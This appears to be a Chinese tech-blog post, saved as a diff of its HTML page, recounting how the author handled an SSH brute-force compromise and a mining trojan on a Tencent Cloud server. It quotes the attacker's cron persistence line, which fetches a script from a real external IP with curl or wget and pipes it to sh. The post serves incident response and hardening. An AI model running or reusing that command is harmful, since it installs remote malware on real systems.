@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"nokiam9.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":true,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.json","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false,"trigger":"auto"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="突然，腾讯云发出安全提示信息，先是SSH暴力破解的警告，过了几天又是ECS被植入木马的警告，Linux的安全防护被提上日程了！  服务器的问题表现  * 登录ECS服务器，用top命令检查系统状态，发现CPU负荷长期维持100%，系统响应缓慢，其中&#x2F;tmp&#x2F;vThHH严重消耗资源，确认中招了！   * 服务器的root口令没有变化，但登录成功时提示有几百个failed login attempts">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ECS遭遇安全攻击的一次经历">
+<meta property="og:url" content="https://nokiam9.github.io/2019/05/04/ECS%E9%81%AD%E9%81%87%E5%AE%89%E5%85%A8%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/index.html">
+<meta property="og:site_name" content="Alex的技术博客">
+<meta property="og:description" content="突然，腾讯云发出安全提示信息，先是SSH暴力破解的警告，过了几天又是ECS被植入木马的警告，Linux的安全防护被提上日程了！  服务器的问题表现  * 登录ECS服务器，用top命令检查系统状态，发现CPU负荷长期维持100%，系统响应缓慢，其中&#x2F;tmp&#x2F;vThHH严重消耗资源，确认中招了！   * 服务器的root口令没有变化，但登录成功时提示有几百个failed login attempts">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://nokiam9.github.io/2019/05/04/ECS%E9%81%AD%E9%81%87%E5%AE%89%E5%85%A8%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/alert-0.png">
+<meta property="og:image" content="https://nokiam9.github.io/2019/05/04/ECS%E9%81%AD%E9%81%87%E5%AE%89%E5%85%A8%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/alert-1.png">
+<meta property="article:published_time" content="2019-05-04T12:11:03.000Z">
+<meta property="article:modified_time" content="2026-02-23T08:34:15.779Z">
+<meta property="article:author" content="Alex Sun">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://nokiam9.github.io/2019/05/04/ECS%E9%81%AD%E9%81%87%E5%AE%89%E5%85%A8%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/alert-0.png">
+
+
+<link rel="canonical" href="https://nokiam9.github.io/2019/05/04/ECS%E9%81%AD%E9%81%87%E5%AE%89%E5%85%A8%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://nokiam9.github.io/2019/05/04/ECS%E9%81%AD%E9%81%87%E5%AE%89%E5%85%A8%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/","path":"2019/05/04/ECS遭遇安全攻击的一次经历/","title":"ECS遭遇安全攻击的一次经历"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>ECS遭遇安全攻击的一次经历 | Alex的技术博客</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script><script src="/js/bookmark.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+  <script class="next-config" data-name="pdf" type="application/json">{"object_url":{"url":"https://cdnjs.cloudflare.com/ajax/libs/pdfobject/2.3.1/pdfobject.min.js","integrity":"sha256-jI72I8ZLVflVOisZIOaLvRew3tyvzeu6aZXFm7P7dEo="},"url":"/lib/pdf/web/viewer.html"}</script>
+  <script src="/js/third-party/tags/pdf.js" defer></script>
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"none","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mathjax/3.2.2/es5/tex-mml-chtml.js","integrity":"sha256-MASABpB4tYktI2Oitl4t+78w/lyA+D7b/s9GEP0JOGI="}}</script>
+<script src="/js/third-party/math/mathjax.js" defer></script>
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">Alex的技术博客</p>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="搜索..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E9%97%AE%E9%A2%98%E8%A1%A8%E7%8E%B0"><span class="nav-text">服务器的问题表现</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%B3%BB%E7%BB%9F%E6%A3%80%E6%9F%A5%E7%9A%84%E4%B8%BB%E8%A6%81%E5%B7%A5%E4%BD%9C"><span class="nav-text">系统检查的主要工作</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%A5%E6%9C%A8%E9%A9%AC%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="nav-text">该木马的工作原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A4%84%E7%90%86%E6%8E%AA%E6%96%BD"><span class="nav-text">处理措施</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A6%82%E4%BD%95%E5%BD%BB%E5%BA%95%E8%A7%A3%E5%86%B3SSH%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E7%9A%84%E5%A8%81%E8%83%81"><span class="nav-text">如何彻底解决SSH暴力破解的威胁</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%84%E5%BD%951-%E5%85%B3%E4%BA%8Elsof%E5%91%BD%E4%BB%A4"><span class="nav-text">附录1: 关于lsof命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%99%84%E5%BD%952%EF%BC%9A%E5%85%B3%E4%BA%8Ecrontab%E5%91%BD%E4%BB%A4"><span class="nav-text">附录2：关于crontab命令</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Alex Sun</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">114</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://nokiam9.github.io/2019/05/04/ECS%E9%81%AD%E9%81%87%E5%AE%89%E5%85%A8%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Alex Sun">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Alex的技术博客">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="ECS遭遇安全攻击的一次经历 | Alex的技术博客">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ECS遭遇安全攻击的一次经历
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2019-05-04 20:11:03" itemprop="dateCreated datePublished" datetime="2019-05-04T20:11:03+08:00">2019-05-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-02-23 16:34:15" itemprop="dateModified" datetime="2026-02-23T16:34:15+08:00">2026-02-23</time>
+    </span>
+
+  
+    <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv">
+      <span class="post-meta-item-icon">
+        <i class="far fa-eye"></i>
+      </span>
+      <span class="post-meta-item-text">阅读次数：</span>
+      <span id="busuanzi_value_page_pv"></span>
+    </span>
+    <span class="post-meta-break"></span>
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>1.5k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>6 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><p>突然，腾讯云发出安全提示信息，先是SSH暴力破解的警告，过了几天又是ECS被植入木马的警告，Linux的安全防护被提上日程了！</p>
+<h2 id="服务器的问题表现"><a href="#服务器的问题表现" class="headerlink" title="服务器的问题表现"></a>服务器的问题表现</h2><img src="/2019/05/04/ECS%E9%81%AD%E9%81%87%E5%AE%89%E5%85%A8%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/alert-0.png" class="" title="腾讯云的警告信息汇总">
+
+<ul>
+<li>登录ECS服务器，用<code>top</code>命令检查系统状态，发现CPU负荷长期维持100%，系统响应缓慢，其中<code>/tmp/vThHH</code>严重消耗资源，确认中招了！</li>
+</ul>
+<img src="/2019/05/04/ECS%E9%81%AD%E9%81%87%E5%AE%89%E5%85%A8%E6%94%BB%E5%87%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E7%BB%8F%E5%8E%86/alert-1.png" class="" title="SSH暴力破解的警告信息">
+
+<ul>
+<li>服务器的root口令没有变化，但登录成功时提示有几百个<code>failed login attempts</code>，说明SSH口令已经被暴力破解</li>
+</ul>
+<h2 id="系统检查的主要工作"><a href="#系统检查的主要工作" class="headerlink" title="系统检查的主要工作"></a>系统检查的主要工作</h2><p>主要从以下几个方面入手：</p>
+<ol>
+<li><p>检查网络服务</p>
+<p> 使用<code>netstat -nlp</code>，发现除了22，80，443端口，还对外暴露了可疑的7946端口，调用者是<code>/tmp/vThHH</code>。</p>
+</li>
+<li><p>检查系统进程</p>
+<p> 通过<code>ps -ef</code>命令，跟踪可疑进程<code>/tmp/vThHH</code>，发现父进程就是木马程序<code>/usr/bin/ybznfa2</code>。<br> 进一步检查，发现了木马的加载进程。</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root      4365   736  0 18:30 ?        00:00:00 /usr/sbin/CROND -n</span><br><span class="line">root      4366  4365  0 18:30 ?        00:00:00 /bin/sh -c (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/local/bin/ybznfa2||/tmp/ybznfa2||curl -m180 -fsSL http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) | sh</span><br><span class="line">root      4367  4366  0 18:30 ?        00:00:00 /bin/sh -c (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/local/bin/ybznfa2||/tmp/ybznfa2||curl -m180 -fsSL http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) |sh</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>检查cron任务</p>
+<p> 该木马由crond启动，通过<code>crontab -u root -l</code>检查定时任务，发现每15分钟就执行一次上述bash脚本，这就是木马的埋点！</p>
+ <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/15 * * * * (/usr/bin/ybznfa2||/usr/libexec/ybznfa2||/usr/local/bin/ybznfa2||/tmp/ybznfa2||curl -fsSL -m180 http://109.237.25.145:8000/i.sh||wget -q -T180 -O- http://109.237.25.145:8000/i.sh) | sh</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h2 id="该木马的工作原理"><a href="#该木马的工作原理" class="headerlink" title="该木马的工作原理"></a>该木马的工作原理</h2><ul>
+<li>通过网络爬虫等手段收集服务器域名信息</li>
+<li>以服务器默认的root用户，通过ssh暴力破解获得口令</li>
+<li>通过ssh登录，添加cron定时任务，从远端服务器下载木马程序，并存放在多个目录下</li>
+<li>后台启动木马，打开自定义端口进行远程控制</li>
+</ul>
+<h2 id="处理措施"><a href="#处理措施" class="headerlink" title="处理措施"></a>处理措施</h2><ul>
+<li>手工清理cron的任务清单</li>
+<li>手工杀死<code>/tmp/vThHH</code>，<code>/usr/bin/ybznfa2</code>等可疑进程</li>
+<li>手工删除上述木马程序</li>
+<li>检查系统进程、网络服务、定时任务等状态，确认问题解决</li>
+</ul>
+<h2 id="如何彻底解决SSH暴力破解的威胁"><a href="#如何彻底解决SSH暴力破解的威胁" class="headerlink" title="如何彻底解决SSH暴力破解的威胁"></a>如何彻底解决SSH暴力破解的威胁</h2><p>最有效的方法就是，关闭口令登录方式，改为密钥登录，请参见下一片文章。</p>
+<p><em><strong>应该说，腾讯云提供的安全服务还是比较有效的，赞一个！</strong></em></p>
+<hr>
+<h2 id="附录1-关于lsof命令"><a href="#附录1-关于lsof命令" class="headerlink" title="附录1: 关于lsof命令"></a>附录1: 关于lsof命令</h2><p>查看被占用端口的归属进程，可用使用<code>lsof -i:&lt;port&gt;</code>命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_17_centos <span class="built_in">log</span>]# lsof -i:80</span><br><span class="line">COMMAND PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">nginx   936  root    6u  IPv4  15296      0t0  TCP *:http (LISTEN)</span><br><span class="line">nginx   937 nginx    6u  IPv4  15296      0t0  TCP *:http (LISTEN)</span><br></pre></td></tr></table></figure>
+
+<p>查看某个进程使用的系统资源信息，包括文件、端口等，可以使用<code>lsof -p &lt;pid&gt;</code> 命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_17_centos <span class="built_in">log</span>]# lsof -p 527</span><br><span class="line">COMMAND   PID USER   FD      TYPE             DEVICE SIZE/OFF   NODE NAME</span><br><span class="line">YDService 527 root  cwd       DIR              253,1     4096 525988 /usr/local/qcloud/YunJing/YDEyes</span><br><span class="line">YDService 527 root  rtd       DIR              253,1     4096      2 /</span><br><span class="line">YDService 527 root  txt       REG              253,1  5194952 525989 /usr/local/qcloud/YunJing/YDEyes/YDService</span><br><span class="line">YDService 527 root  mem       REG              253,1    68192 266804 /usr/lib64/libbz2.so.1.0.6</span><br><span class="line">YDService 527 root  mem       REG              253,1   157424 266780 /usr/lib64/liblzma.so.5.2.2</span><br><span class="line">YDService 527 root  mem       REG              253,1    90248 265916 /usr/lib64/libz.so.1.2.7</span><br><span class="line">YDService 527 root  mem       REG              253,1    99944 266803 /usr/lib64/libelf-0.170.so</span><br><span class="line">YDService 527 root  mem       REG              253,1    19896 266044 /usr/lib64/libattr.so.1.1.0</span><br><span class="line">YDService 527 root  mem       REG              253,1   297360 274746 /usr/lib64/libdw-0.170.so</span><br><span class="line">YDService 527 root  mem       REG              253,1    20032 266047 /usr/lib64/libcap.so.2.22</span><br><span class="line">YDService 527 root  mem       REG              253,1    86544 274509 /usr/lib64/libnss_myhostname.so.2</span><br><span class="line">YDService 527 root  mem       REG              253,1   106848 265653 /usr/lib64/libresolv-2.17.so</span><br><span class="line">YDService 527 root  mem       REG              253,1    31824 265641 /usr/lib64/libnss_dns-2.17.so</span><br><span class="line">YDService 527 root  mem       REG              253,1    62184 265643 /usr/lib64/libnss_files-2.17.so</span><br><span class="line">YDService 527 root  mem       REG              253,1  2173512 265625 /usr/lib64/libc-2.17.so</span><br><span class="line">YDService 527 root  mem       REG              253,1    88720 262170 /usr/lib64/libgcc_s-4.8.5-20150702.so.1</span><br><span class="line">YDService 527 root  mem       REG              253,1  1139680 265633 /usr/lib64/libm-2.17.so</span><br><span class="line">YDService 527 root  mem       REG              253,1   995840 265950 /usr/lib64/libstdc++.so.6.0.19</span><br><span class="line">YDService 527 root  mem       REG              253,1    19776 265631 /usr/lib64/libdl-2.17.so</span><br><span class="line">YDService 527 root  mem       REG              253,1   144792 265651 /usr/lib64/libpthread-2.17.so</span><br><span class="line">YDService 527 root  mem       REG              253,1    44448 265655 /usr/lib64/librt-2.17.so</span><br><span class="line">YDService 527 root  mem       REG              253,1   164240 265618 /usr/lib64/ld-2.17.so</span><br><span class="line">YDService 527 root    0w      REG              253,1   227581 525140 /usr/local/qcloud/YunJing/log/ydservice.20190505.<span class="built_in">log</span></span><br><span class="line">YDService 527 root    1u      CHR                1,3      0t0   5078 /dev/null</span><br><span class="line">YDService 527 root    2u  a_inode               0,10        0   5074 [eventpoll]</span><br><span class="line">YDService 527 root    3uW     REG               0,19        3  13104 /run/YDService.pid</span><br><span class="line">YDService 527 root    4u     IPv4              17010      0t0    TCP VM_0_17_centos:45598-&gt;169.254.0.55:lsi-bobcat (ESTABLISHED)</span><br><span class="line">YDService 527 root    5u     unix 0xffff8da7babcec00      0t0  17082 /usr/local/yd.socket.server</span><br><span class="line">YDService 527 root    6u  a_inode               0,10        0   5074 [timerfd]</span><br><span class="line">YDService 527 root    7r  a_inode               0,10        0   5074 inotify</span><br><span class="line">YDService 527 root    8u  a_inode               0,10        0   5074 [timerfd]</span><br><span class="line">YDService 527 root    9u  a_inode               0,10        0   5074 [timerfd]</span><br><span class="line">YDService 527 root   10u  a_inode               0,10        0   5074 [timerfd]</span><br><span class="line">YDService 527 root   11u  a_inode               0,10        0   5074 [timerfd]</span><br><span class="line">YDService 527 root   24u     unix 0xffff8da7bb51fc00      0t0  17639 /usr/local/yd.socket.server</span><br></pre></td></tr></table></figure>
+
+<h2 id="附录2：关于crontab命令"><a href="#附录2：关于crontab命令" class="headerlink" title="附录2：关于crontab命令"></a>附录2：关于crontab命令</h2><ul>
+<li>crond是常用的木马启动入口，主要的配置文件存放在 <code>/var/spool/cron/</code>目录下。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_17_centos etc]# <span class="built_in">ls</span> -l /var/spool/cron</span><br><span class="line">总用量 4</span><br><span class="line">drwxr-xr-x 2 root root 4096 4月  18 20:58 crontabs</span><br><span class="line">-rw------- 1 root root    0 5月   5 11:10 root</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>也可能存放在<code>/etc/cron.d/</code>等类似目录下。</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_17_centos etc]# <span class="built_in">ls</span> -lF /etc |grep cron</span><br><span class="line">-rw-------.  1 root root      541 4月  11 2018 anacrontab</span><br><span class="line">drwxr-xr-x.  2 root root     4096 4月  30 16:47 cron.d/</span><br><span class="line">drwxr-xr-x.  2 root root     4096 8月   8 2018 cron.daily/</span><br><span class="line">-rw-------.  1 root root        0 4月  11 2018 cron.deny</span><br><span class="line">drwxr-xr-x.  2 root root     4096 8月   8 2018 cron.hourly/</span><br><span class="line">drwxr-xr-x.  2 root root     4096 6月  10 2014 cron.monthly/</span><br><span class="line">-rw-r--r--.  1 root root      451 6月  10 2014 crontab</span><br><span class="line">drwxr-xr-x.  2 root root     4096 6月  10 2014 cron.weekly/</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>cron的运行日志保存在<code>/var/log/cron</code>文件中，内容格式为</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@VM_0_17_centos <span class="built_in">log</span>]# <span class="built_in">head</span> /var/log/cron</span><br><span class="line"></span><br><span class="line">Dec 21 09:11:35 VM_0_17_centos crontab[1627]: (root) LIST (root)</span><br><span class="line">Dec 21 09:11:35 VM_0_17_centos crontab[1626]: (root) REPLACE (root)</span><br><span class="line">Dec 21 09:11:42 VM_0_17_centos crontab[1698]: (root) LIST (root)</span><br><span class="line">Dec 21 09:11:42 VM_0_17_centos crontab[1702]: (root) LIST (root)</span><br><span class="line">Dec 21 09:11:42 VM_0_17_centos crontab[1701]: (root) REPLACE (root)</span><br><span class="line">Dec 21 09:11:42 VM_0_17_centos crontab[1728]: (root) LIST (root)</span><br><span class="line">Dec 21 09:11:42 VM_0_17_centos crontab[1730]: (root) REPLACE (root)</span><br><span class="line">Dec 21 09:12:02 VM_0_17_centos CROND[1811]: (root) CMD (/usr/local/qcloud/stargate/admin/start.sh &gt; /dev/null 2&gt;&amp;1 &amp;)</span><br><span class="line">Dec 21 09:12:32 VM_0_17_centos crond[739]: (CRON) INFO (Shutting down)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><a target="_blank" rel="noopener" href="http://www.cnblogs.com/longjshz/p/5779215.html">crontab配置方法的参考文档</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2019/04/01/Kubernetes-for-Mac%E7%9A%84%E5%AE%89%E8%A3%85%E6%96%B9%E6%B3%95%E5%92%8C%E9%97%AE%E9%A2%98%E8%AE%B0%E5%BD%95/" rel="prev" title="Kubernetes for Mac的安装方法和问题记录">
+                  <i class="fa fa-angle-left"></i> Kubernetes for Mac的安装方法和问题记录
+                </a>
+            </div>
+            <div class="post-nav-item">
